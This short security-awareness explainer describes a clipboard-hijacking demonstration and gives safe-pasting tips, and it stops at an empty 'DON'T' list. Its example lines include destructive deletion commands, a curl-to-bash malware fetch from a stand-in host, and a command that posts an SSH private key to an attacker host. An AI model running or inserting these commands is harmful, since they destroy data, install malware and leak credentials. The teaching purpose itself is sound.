üéì What Just Happened?

You just experienced a clipboard hijacking attack. Here's what happened:

The Attack:
When you copied the command, JavaScript detected the copy event and modified your clipboard content before you pasted it. In a real attack, this could:
  • Delete important files (rm -rf /, del /s /q C:\)
  • Download and execute malware (curl evil.com/malware.sh | bash)
  • Steal sensitive data (cat ~/.ssh/id_rsa | curl -X POST attacker.com)
  • Create backdoors or modify system settings

‚úÖ DO:
  • Always read commands before pressing Enter
  • Type commands manually when possible
  • Use official documentation from trusted sources
  • Paste into a text editor first to review
  • Be extra careful with commands containing: rm, del, curl, wget
‚ùå DON'T:
